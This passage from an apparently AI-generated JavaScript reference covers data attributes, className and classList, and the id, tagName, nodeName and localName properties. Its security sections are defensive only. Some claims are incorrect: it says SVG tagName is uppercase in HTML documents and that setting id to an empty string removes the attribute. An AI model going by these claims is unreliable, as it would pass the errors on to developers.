el.getAttribute('data-userid'); // Also returns value

// dataset converts to lowercase
el.dataset.userId; // undefined (attribute is data-userid)
el.dataset.userid; // Returns value
```

#### Special Character Edge Cases

```javascript
// Underscores preserved
el.dataset.user_id; // data-user_id (not converted)

// Numbers in middle preserved
el.dataset.item2name; // data-item2name

// Leading underscore
el.dataset._private; // data-_private

// Multiple consecutive hyphens in HTML
<div data-user--name="test"></div>
el.dataset['user-Name']; // [Unverified] Exact behavior may vary
```

#### Unicode and International Characters

```javascript
// Unicode characters in data attributes (valid HTML5)
<div data-名前="田中"></div>
el.dataset.名前; // Returns "田中"

// Emoji
<div data-icon="🔥"></div>
el.dataset.icon; // Returns "🔥"
```

#### Prototype Pollution Concerns

[Inference] Since dataset properties are accessible via bracket notation, be cautious with user-controlled input:

```javascript
// Potentially dangerous if key comes from user input
const userKey = '__proto__'; // Or 'constructor', 'prototype'
el.dataset[userKey] = 'malicious'; // May not work as expected with DOMStringMap

// Safer: validate keys
const safeSets = ['userId', 'userName', 'userEmail'];
if (safeSets.includes(userKey)) {
  el.dataset[userKey] = value;
}
```

### Common Patterns and Use Cases

#### Component State Management

```javascript
// Store component state
class Accordion {
  constructor(element) {
    this.element = element;
    
    // Initialize from data attributes
    this.isOpen = this.element.dataset.open === 'true';
    this.duration = parseInt(this.element.dataset.duration, 10) || 300;
  }
  
  toggle() {
    this.isOpen = !this.isOpen;
    this.element.dataset.open = this.isOpen; // Persist state
  }
}
```

#### Event Delegation with Data Attributes

```javascript
// HTML: <button data-action="delete" data-id="123">Delete</button>

document.addEventListener('click', (e) => {
  const action = e.target.dataset.action;
  const id = e.target.dataset.id;
  
  if (action === 'delete') {
    deleteItem(id);
  } else if (action === 'edit') {
    editItem(id);
  }
});
```

#### Configuration Storage

```javascript
// HTML: <div class="chart" 
//           data-type="line" 
//           data-width="600" 
//           data-height="400"
//           data-options='{"smooth":true}'>

const chart = document.querySelector('.chart');
const config = {
  type: chart.dataset.type,
  width: parseInt(chart.dataset.width, 10),
  height: parseInt(chart.dataset.height, 10),
  options: JSON.parse(chart.dataset.options || '{}')
};
```

#### Progressive Enhancement

```javascript
// HTML: <form data-ajax="true" data-endpoint="/api/submit">

const form = document.querySelector('form');

if (form.dataset.ajax === 'true') {
  form.addEventListener('submit', async (e) => {
    e.preventDefault();
    const response = await fetch(form.dataset.endpoint, {
      method: 'POST',
      body: new FormData(form)
    });
    // Handle response
  });
}
// Otherwise, form submits normally
```

#### State Tracking for CSS

```javascript
// Toggle states reflected in CSS
const button = document.querySelector('.toggle');

button.addEventListener('click', () => {
  const currentState = button.dataset.state || 'off';
  const newState = currentState === 'off' ? 'on' : 'off';
  button.dataset.state = newState;
});

// CSS: [data-state="on"] { background: green; }
```

#### Feature Detection Storage

```javascript
// Store feature availability
if ('geolocation' in navigator) {
  document.documentElement.dataset.geolocation = 'true';
}

if (window.matchMedia('(hover: hover)').matches) {
  document.documentElement.dataset.hover = 'true';
}

// CSS can then adapt
// html[data-hover="true"] .tooltip { display: block; }
```

### Security Considerations

#### XSS Prevention

```javascript
// Never directly insert data attributes into HTML strings
const userId = userInput; // Potentially malicious

// Unsafe
element.innerHTML = `<div data-user="${userId}"></div>`;

// Safe: use DOM methods
const div = document.createElement('div');
div.dataset.user = userId; // Automatically escaped
element.appendChild(div);
```

#### Sensitive Data Storage

Data attributes are visible in the DOM and browser DevTools. Avoid storing:

- Authentication tokens
- Personal identification numbers
- Passwords or secrets
- Sensitive user information

```javascript
// Bad: sensitive data exposed
el.dataset.apiKey = 'secret-key-123';
el.dataset.ssn = '123-45-6789';

// Good: use memory-only storage
const privateData = new WeakMap();
privateData.set(el, { apiKey: 'secret-key-123' });
```

#### Content Security Policy Interaction

[Inference] Data attributes themselves don't trigger CSP violations, but their values might be used in ways that do:

```javascript
// If data attribute contains a URL used for fetch
const url = el.dataset.endpoint; // 'https://external-api.com'
fetch(url); // May violate CSP if external domain not allowed
```

### Alternatives and Comparisons

#### WeakMap for Private Data

```javascript
// Dataset: public, visible in DOM
el.dataset.counter = '0';

// WeakMap: private, memory-only
const privateData = new WeakMap();
privateData.set(el, { counter: 0 });

// Automatic garbage collection when element removed
```

#### JavaScript Object Storage

```javascript
// For elements you control by reference
const elementData = {
  counter: 0,
  callbacks: [],
  config: {}
};

// Access via reference, no DOM pollution
// But: lost when page reloads, not serializable
```

#### classList for Boolean States

```javascript
// Simple boolean states better as classes
// Instead of:
el.dataset.active = 'true';
if (el.dataset.active === 'true') { }

// Use:
el.classList.add('active');
if (el.classList.contains('active')) { }
```

#### Form Hidden Inputs

```javascript
// For form-related data that needs to be submitted
// Instead of: <form><div data-user-id="123"></div>...

// Use: <form><input type="hidden" name="userId" value="123">...
// Automatically included in form submission
```

### Serialization and Cloning

#### Element Cloning

```javascript
const original = document.querySelector('.item');
original.dataset.userId = '123';

// Deep clone includes data attributes
const clone = original.cloneNode(true);
console.log(clone.dataset.userId); // '123'

// Shallow clone of element (no children)
const shallowClone = original.cloneNode(false);
console.log(shallowClone.dataset.userId); // '123'
```

#### Serialization to Object

```javascript
// Extract all data attributes to plain object
function serializeDataset(element) {
  return Object.keys(element.dataset).reduce((obj, key) => {
    obj[key] = element.dataset[key];
    return obj;
  }, {});
}

const data = serializeDataset(el);
// { userId: '123', userName: 'John', userEmail: 'john@example.com' }
```

#### Hydration from Object

```javascript
// Apply object properties to dataset
function hydrateDataset(element, data) {
  Object.keys(data).forEach(key => {
    element.dataset[key] = data[key];
  });
}

hydrateDataset(el, { userId: '456', status: 'active' });
```

### Framework Integration Patterns

#### React

```javascript
// JSX automatically handles data attributes
<div data-user-id={userId} data-status="active">

// Accessing in refs
const ref = useRef();
useEffect(() => {
  console.log(ref.current.dataset.userId);
}, []);

return <div ref={ref} data-user-id={userId} />;
```

#### Vue

```javascript
// Template binding
<template>
  <div :data-user-id="userId" :data-status="status">
</template>

// Accessing in mounted hook
mounted() {
  console.log(this.$el.dataset.userId);
}
```

#### Vanilla JS Component Pattern

```javascript
class Component {
  constructor(element) {
    this.element = element;
    this.config = this.loadConfig();
  }
  
  loadConfig() {
    // Load all data-config-* attributes
    const config = {};
    Object.keys(this.element.dataset).forEach(key => {
      if (key.startsWith('config')) {
        const configKey = key.replace('config', '');
        const normalizedKey = configKey.charAt(0).toLowerCase() + configKey.slice(1);
        config[normalizedKey] = this.element.dataset[key];
      }
    });
    return config;
  }
  
  updateState(key, value) {
    this.element.dataset[`state${key.charAt(0).toUpperCase()}${key.slice(1)}`] = value;
  }
}
```

---

## Class Manipulation (className, classList)

### The className Property

#### Basic Usage and Characteristics

The `className` property provides direct access to an element's `class` attribute as a string. It represents the complete space-separated list of classes assigned to an element.

```javascript
const element = document.querySelector('.box');

// Reading
console.log(element.className); // "box active highlight"

// Setting (replaces all classes)
element.className = "new-class another-class";

// Appending (manual concatenation required)
element.className += " additional-class";
```

#### String-Based Manipulation Patterns

**Complete Replacement**:

```javascript
// Overwrites all existing classes
element.className = "single-class";
```

**Conditional Addition**:

```javascript
if (element.className.indexOf('active') === -1) {
  element.className += ' active';
}
```

**Removal via String Replacement**:

```javascript
element.className = element.className.replace('active', '').trim();
// Issue: removes partial matches
element.className = element.className.replace(/\bactive\b/g, '').trim();
// Better: word boundary regex
```

**Multiple Class Operations**:

```javascript
// Split, modify, join pattern
const classes = element.className.split(' ');
classes.push('new-class');
element.className = classes.join(' ');
```

#### className Pitfalls and Edge Cases

**Whitespace Handling**:

```javascript
element.className = "class1  class2"; // Multiple spaces
element.className += " class3"; // Leading space required
```

The browser normalizes multiple spaces when rendering, but `className` returns the exact string set, potentially including extra whitespace.

**Duplicate Classes**:

```javascript
element.className = "box box active"; // Duplicates allowed
// Browser treats duplicates as single class for styling purposes
// but className string contains both
```

**Empty String Edge Case**:

```javascript
if (element.className === '') {
  element.className = 'first-class'; // No space needed
} else {
  element.className += ' another-class'; // Space required
}
```

**Special Characters in Class Names**:

```javascript
// Valid but problematic with string manipulation
element.className = "my-class my.class my_class";
// Regex patterns must account for dots, hyphens, underscores
```

**Performance Characteristics**: Setting `className` triggers style recalculation and potential reflow. Batch operations are more efficient than multiple sequential modifications:

```javascript
// Less efficient
element.className += ' class1';
element.className += ' class2';
element.className += ' class3';

// More efficient
element.className += ' class1 class2 class3';
```

#### SVG className Complications

For SVG elements, `className` returns an `SVGAnimatedString` object rather than a plain string:

```javascript
const svgElement = document.querySelector('svg circle');

// SVG returns object
console.log(typeof svgElement.className); // "object"

// Access via baseVal
console.log(svgElement.className.baseVal); // actual string

// Setting requires baseVal
svgElement.className.baseVal = "new-class";
```

This inconsistency led to `classList` becoming the preferred method for cross-element-type class manipulation.

### The classList Property

#### Interface and Core Methods

`classList` returns a `DOMTokenList` object providing a set-like interface for class manipulation. [Inference: The DOMTokenList interface was designed to address the ergonomic and reliability issues of string-based class manipulation]

**Core Methods**:

**`.add(class1, class2, ...classN)`**:

```javascript
element.classList.add('active');
element.classList.add('class1', 'class2', 'class3'); // Multiple classes
```

Behavior:

- Ignores classes already present (idempotent)
- Throws `SyntaxError` for invalid class names (empty string, whitespace)
- Does not add duplicates
- More efficient than string concatenation

**`.remove(class1, class2, ...classN)`**:

```javascript
element.classList.remove('active');
element.classList.remove('class1', 'class2', 'class3');
```

Behavior:

- Silently succeeds if class not present (no error)
- Removes all occurrences if duplicates exist
- Throws `SyntaxError` for invalid class names

**`.toggle(class, force?)`**:

```javascript
// Basic toggle
element.classList.toggle('active'); // Returns boolean (new state)

// With force parameter
element.classList.toggle('active', true);  // Equivalent to add()
element.classList.toggle('active', false); // Equivalent to remove()
```

Return value indicates whether class is present after operation:

```javascript
const isActive = element.classList.toggle('active');
if (isActive) {
  console.log('Class was added');
} else {
  console.log('Class was removed');
}
```

The `force` parameter enables conditional addition/removal:

```javascript
// Add class only if condition is true
element.classList.toggle('visible', isVisible);

// Equivalent to:
if (isVisible) {
  element.classList.add('visible');
} else {
  element.classList.remove('visible');
}
```

**`.contains(class)`**:

```javascript
if (element.classList.contains('active')) {
  // Class is present
}
```

More reliable than string searching:

```javascript
// className approach (error-prone)
if (element.className.indexOf('active') !== -1) { } // Matches 'inactive'

// classList approach (exact match)
if (element.classList.contains('active')) { } // Correct
```

**`.replace(oldClass, newClass)`**:

```javascript
// Returns true if replacement occurred, false if oldClass wasn't present
const replaced = element.classList.replace('old-class', 'new-class');
```

More efficient than remove + add sequence:

```javascript
// Less efficient
element.classList.remove('old-class');
element.classList.add('new-class');

// More efficient (single operation)
element.classList.replace('old-class', 'new-class');
```

#### DOMTokenList Properties and Iteration

**`.length` Property**:

```javascript
const classCount = element.classList.length;
console.log(`Element has ${classCount} classes`);
```

**Index Access**:

```javascript
// Array-like numeric indexing
for (let i = 0; i < element.classList.length; i++) {
  console.log(element.classList[i]);
}

// Direct access
const firstClass = element.classList[0];
```

**`.item(index)` Method**:

```javascript
const className = element.classList.item(0);
// Returns null for out-of-bounds index
const notFound = element.classList.item(999); // null
```

**Iteration Support**:

```javascript
// forEach (not supported in IE11)
element.classList.forEach((className, index) => {
  console.log(`Class ${index}: ${className}`);
});

// for...of loop
for (const className of element.classList) {
  console.log(className);
}

// Spread operator
const classArray = [...element.classList];

// Array.from()
const classArray2 = Array.from(element.classList);
```

**`.value` Property**:

```javascript
// Same as className but works consistently with SVG
console.log(element.classList.value); // "class1 class2 class3"

// Setting value (same as className = )
element.classList.value = "new-class another-class";
```

#### Advanced classList Patterns

**Atomic State Management**:

```javascript
// Toggle between mutually exclusive states
function setState(element, state) {
  element.classList.remove('state-idle', 'state-loading', 'state-error', 'state-success');
  element.classList.add(`state-${state}`);
}
```

**Conditional Multiple Class Addition**:

```javascript
const classesToAdd = ['class1', 'class2', 'class3'];
element.classList.add(...classesToAdd);

// Conditional
const classes = condition ? ['active', 'highlight'] : ['inactive', 'dimmed'];
element.classList.add(...classes);
```

**Class Set Operations**:

```javascript
// Union (add all classes from another element)
element1.classList.add(...element2.classList);

// Intersection check
const hasAllClasses = ['class1', 'class2', 'class3'].every(
  cls => element.classList.contains(cls)
);

// Difference (remove classes present in another element)
element2.classList.forEach(cls => element1.classList.remove(cls));
```

**Prefix-Based Manipulation**:

```javascript
// Remove all classes with specific prefix
function removeClassesWithPrefix(element, prefix) {
  const toRemove = [...element.classList].filter(cls => cls.startsWith(prefix));
  element.classList.remove(...toRemove);
}

removeClassesWithPrefix(element, 'state-');
```

**Bulk Toggle Pattern**:

```javascript
function toggleClasses(element, classes, force) {
  classes.forEach(cls => element.classList.toggle(cls, force));
}

toggleClasses(element, ['active', 'visible', 'highlight'], true);
```

#### Performance Considerations

**Batching Operations**:

```javascript
// Less efficient (triggers multiple recalculations)
element.classList.add('class1');
element.classList.add('class2');
element.classList.add('class3');

// More efficient (single recalculation)
element.classList.add('class1', 'class2', 'class3');
```

[Inference: Modern browsers optimize sequential classList operations, but batching provides guaranteed single-recalculation behavior]

**DocumentFragment for Multiple Elements**:

```javascript
// Efficient bulk class manipulation
const fragment = document.createDocumentFragment();
elements.forEach(el => {
  el.classList.add('new-class');
  fragment.appendChild(el);
});
container.appendChild(fragment);
```

**Avoiding Layout Thrashing**:

```javascript
// Causes layout thrashing (read-write-read-write)
elements.forEach(el => {
  if (el.offsetHeight > 100) { // Read (forces layout)
    el.classList.add('tall'); // Write
  }
});

// Better: batch reads, then batch writes
const tallElements = elements.filter(el => el.offsetHeight > 100); // All reads
tallElements.forEach(el => el.classList.add('tall')); // All writes
```

### Browser Compatibility and Polyfills

#### classList Support Timeline

- **IE10+**: Full support for all major methods
- **IE9**: Partial support (no `.add()/.remove()` with multiple arguments, no `.toggle()` force parameter)
- **IE8 and below**: No support

#### SVG classList Support

- **Chrome 35+, Firefox 51+**: Full support
- **Safari 10.1+**: Full support
- **IE/Edge**: Initially unsupported, Edge 16+ has support

#### Polyfill Patterns

**Basic classList Polyfill Structure**:

```javascript
if (!('classList' in document.documentElement)) {
  Object.defineProperty(Element.prototype, 'classList', {
    get: function() {
      const element = this;
      const classes = element.className.split(/\s+/).filter(Boolean);
      
      return {
        add: function() {
          Array.prototype.forEach.call(arguments, function(cls) {
            if (classes.indexOf(cls) === -1) {
              classes.push(cls);
              element.className = classes.join(' ');
            }
          });
        },
        remove: function() {
          Array.prototype.forEach.call(arguments, function(cls) {
            const index = classes.indexOf(cls);
            if (index !== -1) {
              classes.splice(index, 1);
              element.className = classes.join(' ');
            }
          });
        },
        contains: function(cls) {
          return classes.indexOf(cls) !== -1;
        },
        toggle: function(cls, force) {
          const exists = this.contains(cls);
          if (force === true || (force === undefined && !exists)) {
            this.add(cls);
            return true;
          } else if (force === false || (force === undefined && exists)) {
            this.remove(cls);
            return false;
          }
          return !exists;
        }
      };
    }
  });
}
```

[Unverified: Complete polyfill implementation details for all edge cases and browser-specific quirks]

**Multiple Arguments Polyfill (IE9)**:

```javascript
if (window.DOMTokenList && !DOMTokenList.prototype.add.length) {
  const original = DOMTokenList.prototype.add;
  DOMTokenList.prototype.add = function() {
    Array.prototype.forEach.call(arguments, original.bind(this));
  };
}
```

### className vs classList Comparison

#### Use className When:

1. **Complete class replacement is needed**:

```javascript
element.className = "new-class-set";
```

2. **Working with class strings from data attributes or APIs**:

```javascript
element.className = element.dataset.classes;
```

3. **Template-based class assignment**:

```javascript
element.className = `status-${status} priority-${priority}`;
```

4. **Performance-critical bulk replacements**:

```javascript
// Single operation
element.className = generateClassString(options);
```

5. **Legacy browser support required (pre-IE10)**

#### Use classList When:

1. **Adding/removing specific classes**:

```javascript
element.classList.add('active');
element.classList.remove('inactive');
```

2. **Toggling classes**:

```javascript
element.classList.toggle('expanded');
```

3. **Checking class presence**:

```javascript
if (element.classList.contains('selected')) { }
```

4. **Working with SVG elements**:

```javascript
svgElement.classList.add('highlighted'); // Works consistently
```

5. **Preventing duplicate classes**:

```javascript
element.classList.add('active'); // Idempotent
```

6. **Multiple class operations**:

```javascript
element.classList.add('class1', 'class2', 'class3');
```

### Framework Integration Patterns

#### React className Management

**String Concatenation**:

```javascript
function Component({ isActive, isHighlighted }) {
  const className = `box ${isActive ? 'active' : ''} ${isHighlighted ? 'highlight' : ''}`;
  return <div className={className}>Content</div>;
}
```

**Array Join Pattern**:

```javascript
function Component({ isActive, isHighlighted }) {
  const classes = ['box'];
  if (isActive) classes.push('active');
  if (isHighlighted) classes.push('highlight');
  
  return <div className={classes.join(' ')}>Content</div>;
}
```

**Conditional Object Pattern (with libraries)**:

```javascript
import classNames from 'classnames';

function Component({ isActive, isHighlighted }) {
  return (
    <div className={classNames('box', {
      'active': isActive,
      'highlight': isHighlighted
    })}>
      Content
    </div>
  );
}
```

**Ref-based classList Access**:

```javascript
function Component() {
  const divRef = useRef();
  
  useEffect(() => {
    // Direct classList manipulation when needed
    divRef.current.classList.add('animated');
    
    return () => {
      divRef.current.classList.remove('animated');
    };
  }, []);
  
  return <div ref={divRef}>Content</div>;
}
```

#### Vue Class Binding

**Object Syntax**:

```javascript
<template>
  <div :class="{ active: isActive, 'text-danger': hasError }">
    Content
  </div>
</template>
```

**Array Syntax**:

```javascript
<template>
  <div :class="[activeClass, errorClass]">
    Content
  </div>
</template>

<script>
export default {
  data() {
    return {
      activeClass: 'active',
      errorClass: 'text-danger'
    };
  }
}
</script>
```

**Mixed Syntax**:

```javascript
<template>
  <div :class="[{ active: isActive }, errorClass]">
    Content
  </div>
</template>
```

**Direct classList Access**:

```javascript
<script>
export default {
  mounted() {
    this.$el.classList.add('mounted');
  },
  methods: {
    toggleHighlight() {
      this.$refs.element.classList.toggle('highlight');
    }
  }
}
</script>
```

#### Angular Class Manipulation

**NgClass Directive**:

```typescript
<div [ngClass]="{'active': isActive, 'highlight': isHighlighted}">
  Content
</div>

<div [ngClass]="['class1', 'class2', 'class3']">
  Content
</div>

<div [ngClass]="getClassObject()">
  Content
</div>
```

**Class Binding**:

```typescript
<div [class.active]="isActive">Content</div>
```

**ViewChild and Renderer2**:

```typescript
import { Component, ViewChild, ElementRef, Renderer2 } from '@angular/core';

@Component({
  selector: 'app-example',
  template: '<div #element>Content</div>'
})
export class ExampleComponent {
  @ViewChild('element') element: ElementRef;
  
  constructor(private renderer: Renderer2) {}
  
  addClass() {
    this.renderer.addClass(this.element.nativeElement, 'new-class');
  }
  
  removeClass() {
    this.renderer.removeClass(this.element.nativeElement, 'old-class');
  }
}
```

**Direct classList Access**:

```typescript
import { Component, ViewChild, ElementRef } from '@angular/core';

@Component({
  selector: 'app-example',
  template: '<div #element>Content</div>'
})
export class ExampleComponent {
  @ViewChild('element') element: ElementRef;
  
  toggleClass() {
    this.element.nativeElement.classList.toggle('active');
  }
}
```

### Animation and Transition Integration

#### CSS Transition Triggering

**Adding Classes for Transitions**:

```javascript
// Ensure initial state is rendered
element.classList.add('transitioning');

// Force reflow to ensure class is applied
element.offsetHeight;

// Add target state
element.classList.add('expanded');
```

**Removing Classes After Transition**:

```javascript
element.addEventListener('transitionend', function handler(e) {
  if (e.propertyName === 'height') {
    element.classList.remove('transitioning');
    element.removeEventListener('transitionend', handler);
  }
});

element.classList.add('collapsed');
```

#### Animation Class Management

**Sequenced Animation Classes**:

```javascript
async function animateSequence(element) {
  element.classList.add('fade-out');
  await new Promise(resolve => {
    element.addEventListener('animationend', resolve, { once: true });
  });
  
  element.classList.remove('fade-out');
  element.classList.add('fade-in');
  await new Promise(resolve => {
    element.addEventListener('animationend', resolve, { once: true });
  });
  
  element.classList.remove('fade-in');
}
```

**Animation State Management**:

```javascript
const AnimationStates = {
  IDLE: 'anim-idle',
  RUNNING: 'anim-running',
  PAUSED: 'anim-paused',
  FINISHED: 'anim-finished'
};

function setAnimationState(element, state) {
  element.classList.remove(...Object.values(AnimationStates));
  element.classList.add(state);
}
```

### Accessibility Considerations

#### ARIA State Reflection

**Syncing Classes with ARIA Attributes**:

```javascript
function setExpanded(element, expanded) {
  element.classList.toggle('expanded', expanded);
  element.setAttribute('aria-expanded', expanded);
}

function setSelected(element, selected) {
  element.classList.toggle('selected', selected);
  element.setAttribute('aria-selected', selected);
}
```

**Focus-Visible Class Management**:

```javascript
// Modern approach using :focus-visible
element.addEventListener('focus', (e) => {
  // Only add focus class for keyboard navigation
  if (e.target.matches(':focus-visible')) {
    e.target.classList.add('keyboard-focus');
  }
});

element.addEventListener('blur', (e) => {
  e.target.classList.remove('keyboard-focus');
});
```

#### Screen Reader Considerations

Class changes alone don't announce state changes to screen readers. Combine with ARIA attributes:

```javascript
function toggleDisclosure(button, content) {
  const isExpanded = content.classList.contains('expanded');
  
  // Visual change
  content.classList.toggle('expanded');
  button.classList.toggle('active');
  
  // Accessible change
  button.setAttribute('aria-expanded', !isExpanded);
  
  // Optional: announce change
  if (!isExpanded) {
    content.setAttribute('role', 'region');
    content.setAttribute('aria-live', 'polite');
  }
}
```

### Testing and Debugging

#### Testing Class Presence

**Jest/Testing Library**:

```javascript
import { screen } from '@testing-library/react';

test('element has correct class', () => {
  const element = screen.getByRole('button');
  expect(element.classList.contains('active')).toBe(true);
  expect(element).toHaveClass('active');
  expect(element).toHaveClass('active', 'highlight'); // Multiple
});
```

**Cypress**:

```javascript
cy.get('.button')
  .should('have.class', 'active')
  .and('not.have.class', 'disabled');

cy.get('.button').then($el => {
  expect($el[0].classList.contains('active')).to.be.true;
});
```

**Playwright**:

```javascript
const element = await page.locator('.button');
await expect(element).toHaveClass('active');
await expect(element).toHaveClass(/active/); // Regex match

// Multiple classes
await expect(element).toHaveClass(['active', 'highlight']);
```

#### Debugging Class Changes

**MutationObserver for Class Changes**:

```javascript
const observer = new MutationObserver((mutations) => {
  mutations.forEach((mutation) => {
    if (mutation.attributeName === 'class') {
      console.log('Class changed from:', mutation.oldValue);
      console.log('Class changed to:', mutation.target.className);
      console.log('classList:', [...mutation.target.classList]);
    }
  });
});

observer.observe(element, {
  attributes: true,
  attributeOldValue: true,
  attributeFilter: ['class']
});
```

**Console Logging Helper**:

```javascript
function logClassChange(element, operation, ...classes) {
  const before = [...element.classList];
  const result = element.classList[operation](...classes);
  const after = [...element.classList];
  
  console.log(`classList.${operation}(${classes.join(', ')})`);
  console.log('Before:', before);
  console.log('After:', after);
  console.log('Result:', result);
  
  return result;
}

// Usage
logClassChange(element, 'toggle', 'active');
```

### Security Considerations

#### Sanitizing Dynamic Class Names

**Avoiding XSS via className**:

```javascript
// Dangerous: user input directly into className
const userInput = getUserInput();
element.className = userInput; // Could contain malicious content

// Safer: validate against whitelist
const validClasses = ['status-pending', 'status-active', 'status-complete'];
if (validClasses.includes(userInput)) {
  element.className = userInput;
}
```

**classList with User Input**:

```javascript
// Still requires validation
const userClass = getUserInput();

// Validate format (alphanumeric, hyphens, underscores)
if (/^[a-zA-Z0-9_-]+$/.test(userClass)) {
  element.classList.add(userClass);
}
```

[Inference: While className and classList primarily affect styling, malicious class names could potentially interact with CSS rules that execute JavaScript in legacy browsers or trigger unintended behaviors in complex applications]

#### CSS Injection Considerations

**Preventing Selector Injection**:

```javascript
// User controls class name, which affects CSS selector matching
function applyTheme(themeName) {
  // Validate against known themes
  const themes = ['light', 'dark', 'high-contrast'];
  
  if (!themes.includes(themeName)) {
    throw new Error('Invalid theme');
  }
  
  document.body.classList.remove(...themes);
  document.body.classList.add(themeName);
}
```

### Memory and Performance Optimization

#### Class Change Frequency Optimization

**Debouncing Class Changes**:

```javascript
function debounceClassChange(element, className, delay = 300) {
  let timeoutId;
  
  return function(shouldAdd) {
    clearTimeout(timeoutId);
    timeoutId = setTimeout(() => {
      element.classList.toggle(className, shouldAdd);
    }, delay);
  };
}

const debouncedHighlight = debounceClassChange(element, 'highlight');
// Call multiple times, only last takes effect
debouncedHighlight(true);
```

**Throttling Class Updates**:

```javascript
function throttleClassToggle(element, className, limit = 100) {
  let inThrottle;
  
  return function(force) {
    if (!inThrottle) {
      element.classList.toggle(className, force);
      inThrottle = true;
      setTimeout(() => inThrottle = false, limit);
    }
  };
}
```

#### Avoiding Excessive Class Manipulation

**State-Based Approach**:

```javascript
// Instead of toggling multiple classes
function badApproach(element, state) {
  element.classList.remove('state-1', 'state-2', 'state-3');
  element.classList.add(`state-${state}`);
}

// Better: use data attribute + single class
function goodApproach(element, state) {
  element.dataset.state = state;
  // CSS: .component[data-state="1"] { }
}
```

**Batch Updates for Multiple Elements**:

```javascript
// Less efficient
elements.forEach(el => el.classList.add('visible'));

// More efficient with DocumentFragment or requestAnimationFrame
requestAnimationFrame(() => {
  elements.forEach(el => el.classList.add('visible'));
});
```

### Edge Cases and Gotchas

#### Empty Class Handling

```javascript
// className with empty string
element.className = ''; // Removes all classes
element.className = '   '; // Creates empty class attribute

// classList with empty string
element.classList.add(''); // Throws DOMException
element.classList.remove(''); // Throws DOMException
```

#### Whitespace in Class Names

```javascript
// Invalid class names throw errors
try {
  element.classList.add('class with spaces'); // DOMException
} catch(e) {
  console.error('Invalid class name');
}

// className allows it (creates multiple classes)
element.className = 'class with spaces'; // Actually creates 3 classes
```

#### Case Sensitivity

```javascript
// Classes are case-sensitive
element.classList.add('MyClass');
element.classList.contains('myclass'); // false
element.classList.contains('MyClass'); // true

// HTML5 quirks mode may vary
// [Unverified: Specific case-sensitivity behavior across all browser quirks modes]
```

#### classList on Non-Element Nodes

```javascript
const textNode = document.createTextNode('text');
console.log(textNode.classList); // undefined

const fragment = document.createDocumentFragment();
console.log(fragment.classList); // undefined

// Only Element nodes have classList
```

#### Detached Elements

```javascript
const detached = document.createElement('div');
detached.classList.add('class1'); // Works fine
console.log(detached.className); // "class1"

// Class manipulation works identically on detached elements
```

---

## ID and Tag Name Properties

The DOM provides multiple properties for accessing element identifiers and tag names, with subtle but important distinctions in their behavior, return values, and use cases.

### The `id` Property

The `id` property reflects the element's `id` attribute directly. It's a read-write property that exists on all `Element` objects.

**Reading**:

```javascript
const element = document.getElementById('myElement');
console.log(element.id); // "myElement"
```

**Writing**:

```javascript
element.id = 'newId'; // Changes the id attribute
```

**Behavior characteristics**:

- Returns empty string `""` if no `id` attribute exists (not `null` or `undefined`)
- Setting `element.id = ''` removes the `id` attribute from the DOM
- Reflects the attribute bidirectionally: changing `id` property updates the attribute, changing the attribute updates the property
- Case-sensitive: `id="MyElement"` and `id="myelement"` are different
- Must be unique within the document (though browsers don't enforce this - duplicate IDs cause undefined behavior)

**Property vs attribute access**:

```javascript
element.id = 'test';
element.getAttribute('id'); // "test" - same value

element.setAttribute('id', 'newTest');
element.id; // "newTest" - synchronized
```

### The `tagName` Property

The `tagName` property returns the tag name of an element. It's **read-only** and exists on all `Element` objects.

**Basic usage**:

```javascript
const div = document.querySelector('div');
console.log(div.tagName); // "DIV"

const paragraph = document.querySelector('p');
console.log(paragraph.tagName); // "P"
```

**Case behavior**:

- Returns **uppercase** for HTML elements: `"DIV"`, `"SPAN"`, `"P"`
- Returns **case-preserved** for XML/SVG elements in XML documents
- In HTML documents, even custom elements return uppercase: `<my-element>` → `"MY-ELEMENT"`

```javascript
// HTML document
const svg = document.querySelector('svg');
console.log(svg.tagName); // "SVG" - uppercase

const circle = document.querySelector('circle');
console.log(circle.tagName); // "CIRCLE" - uppercase

// Custom element
const custom = document.querySelector('my-component');
console.log(custom.tagName); // "MY-COMPONENT" - uppercase
```

**Immutability**:

```javascript
const element = document.createElement('div');
element.tagName = 'span'; // Has no effect - property is read-only
console.log(element.tagName); // Still "DIV"
```

You cannot change an element's tag name after creation. To effectively "change" a tag, you must create a new element and replace the old one:

```javascript
const oldElement = document.querySelector('div');
const newElement = document.createElement('span');

// Copy attributes
Array.from(oldElement.attributes).forEach(attr => {
  newElement.setAttribute(attr.name, attr.value);
});

// Copy children
while (oldElement.firstChild) {
  newElement.appendChild(oldElement.firstChild);
}

oldElement.parentNode.replaceChild(newElement, oldElement);
```

### The `nodeName` Property

The `nodeName` property exists on all `Node` objects (not just elements) and returns different values depending on node type.

**For element nodes**:

- Returns the same value as `tagName`
- Also uppercase in HTML documents
- Case-preserved in XML documents

```javascript
const div = document.querySelector('div');
console.log(div.nodeName);  // "DIV"
console.log(div.tagName);   // "DIV"
console.log(div.nodeName === div.tagName); // true for elements
```

**For other node types**:

```javascript
// Text node
const textNode = document.createTextNode('Hello');
console.log(textNode.nodeName); // "#text"
console.log(textNode.tagName);  // undefined - not an Element

// Comment node
const comment = document.createComment('comment');
console.log(comment.nodeName); // "#comment"

// Document node
console.log(document.nodeName); // "#document"

// Document fragment
const fragment = document.createDocumentFragment();
console.log(fragment.nodeName); // "#document-fragment"

// Attribute node (deprecated access pattern)
const attr = document.createAttribute('class');
console.log(attr.nodeName); // "class"
```

### The `localName` Property

The `localName` property returns the local part of the qualified name, **always in lowercase** for HTML elements, regardless of document type.

**Basic usage**:

```javascript
const div = document.querySelector('div');
console.log(div.localName); // "div" - lowercase
console.log(div.tagName);   // "DIV" - uppercase
```

**Namespace considerations**:

For elements with namespace prefixes (common in XML/SVG/MathML), `localName` returns only the local part without the prefix:

```javascript
// SVG element
const svg = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
console.log(svg.tagName);    // "svg"
console.log(svg.localName);  // "svg"

// Namespaced element with prefix
const element = document.createElementNS('http://example.com', 'prefix:elementName');
console.log(element.tagName);   // "prefix:elementName"
console.log(element.localName); // "elementName" - without prefix
console.log(element.prefix);    // "prefix"
```

**HTML vs XML behavior**:

```javascript
// HTML document
const htmlDiv = document.createElement('DIV');
console.log(htmlDiv.localName); // "div" - normalized to lowercase

// XML document (if parsed as XML)
const xmlDoc = new DOMParser().parseFromString('<Root><Item/></Root>', 'text/xml');
const item = xmlDoc.querySelector('Item');
console.log(item.localName); // "Item" - preserves case in XML
```

### The `className` Property

The `className` property reflects the `class` attribute. It uses "className" instead of "class" because `class` is a reserved keyword in JavaScript.

**Reading**:

```javascript
